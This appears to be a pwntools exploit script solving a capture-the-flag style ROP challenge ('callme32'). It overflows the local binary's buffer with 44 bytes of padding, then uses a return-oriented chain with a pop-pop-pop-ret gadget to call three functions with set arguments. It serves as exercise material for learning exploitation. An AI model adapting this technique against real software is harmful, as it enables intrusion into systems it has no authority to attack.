#!/usr/bin/env python

from pwn import *

p = process("./callme32")
b = ELF("./callme32")


padding = "A"*44

call_one   = p32(b.symbols['callme_one']) # p32(0x080485c0)
call_two   = p32(b.symbols['callme_two']) # p32(0x08048620)
call_three = p32(b.symbols['callme_three']) # p32(0x080485b0)
pop3       = p32(0x080488a9) # pop esi; pop edi; pop ebp; ret

args = p32(1) + p32(2) + p32(3)

payload = padding + call_one + pop3 + args + call_two + pop3 + args + call_three + pop3 + args

p.recvuntil("> ")
p.sendline(payload)
print p.recvall()

